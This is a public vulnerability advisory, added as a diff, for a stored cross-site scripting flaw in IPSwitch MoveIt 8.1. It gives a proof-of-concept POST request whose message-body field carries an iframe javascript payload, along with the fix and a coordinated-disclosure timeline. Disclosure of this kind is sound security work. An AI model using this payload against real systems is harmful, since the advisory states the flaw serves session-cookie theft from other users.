@@ -1,0 +1,45 @@
+# Exploit Title: IPSwitch MoveIt Stored Cross Site Scripting (XSS)
+# Date: 1-31-2017
+# Software Link: https://www.ipswitch.com/moveit
+# Affected Version: 8.1-9.4 (only confirmed on 8.1 but other versions prior to 9.5 may also be vulnerable)
+# Exploit Author: 1N3@CrowdShield - https://crowdshield.com (Early Warning Security)
+# Contact: https://twitter.com/crowdshield
+# Vendor Homepage: https://www.ipswitch.com 
+# Category: Webapps
+# Attack Type: Remote
+# Impact: Data/Cookie Theft 
+
+
+1. Description
+ 
+IPSwitch MoveIt v8.1 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. Attackers can leverage this vulnerability to send malicious messages to other users in order to steal session cookies and launch client-side attacks. 
+
+
+2. Proof of Concept
+
+The vulnerability lies in the Send Message -> Body Text Area input field.
+ 
+POST /human.aspx?r=692492538 HTTP/1.1
+Host: host.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://host.com/human.aspx?r=510324925
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 598
+
+czf=9c9e7b2a9c9e7b2a9c9e7b2a9c9e7b2a9c066e4aee81bf97f581826d8c093953d82d2b692be5490ece13e6b23f1ad09bda751db1444981eb029d2427175f9906&server=host.com&url=%2Fhuman.aspx&instid=2784&customwizlogoenabled=0&customwiznameup=&customwizzipnameup=%5Bdefault%5D&transaction=secmsgpost&csrftoken=1a9cc0f7aa7ee2d9e0059d6b01da48b69a14669d&curuser=kuxt36r50uhg0sXX&arg12=secmsgcompose&Arg02=&Arg03=452565093&Arg05=edit&Arg07=forward&Arg09=&Arg10=&opt06=&Opt08=&opt01=username&opt02=&opt03=&arg01=FW%3A+test&Opt12=1&arg04=<iframe/src=javascript:alert(1)>&attachment=&opt07=1&arg05_Send=Send
+
+
+3. Solution:
+
+Update to version 9.5
+
+
+4. Disclosure Timeline
+
+1/30/2017 - Disclosed details of vulnerability to IPSwitch.
+1/31/2017 - IPSwitch confirmed the vulnerability and verified the fix as of version 9.5 and approved public disclosure of the vulnerability.
